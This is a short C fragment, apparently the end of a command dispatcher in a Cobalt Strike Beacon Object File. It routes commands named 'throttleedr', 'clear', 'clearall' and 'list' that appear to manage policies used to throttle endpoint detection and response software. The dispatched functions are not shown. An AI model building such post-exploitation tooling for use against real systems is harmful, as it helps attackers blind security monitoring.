    else if (MSVCRT$strcmp(cmd, "throttleedr") == 0) {
        CmdThrottleEdr();
    }
    else if (MSVCRT$strcmp(cmd, "clear") == 0) {
        if (!arg || argLen <= 1) {
            BeaconPrintf(CALLBACK_ERROR, "[-] 'clear' requires a policy Name.");
            return;
        }
        CmdClear(arg);
    }
    else if (MSVCRT$strcmp(cmd, "clearall") == 0) {
        CmdClearAll();
    }
    else if (MSVCRT$strcmp(cmd, "list") == 0 || MSVCRT$strcmp(cmd, "state") == 0) {
        CmdList();
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown command: \"%s\"", cmd);
    }
}
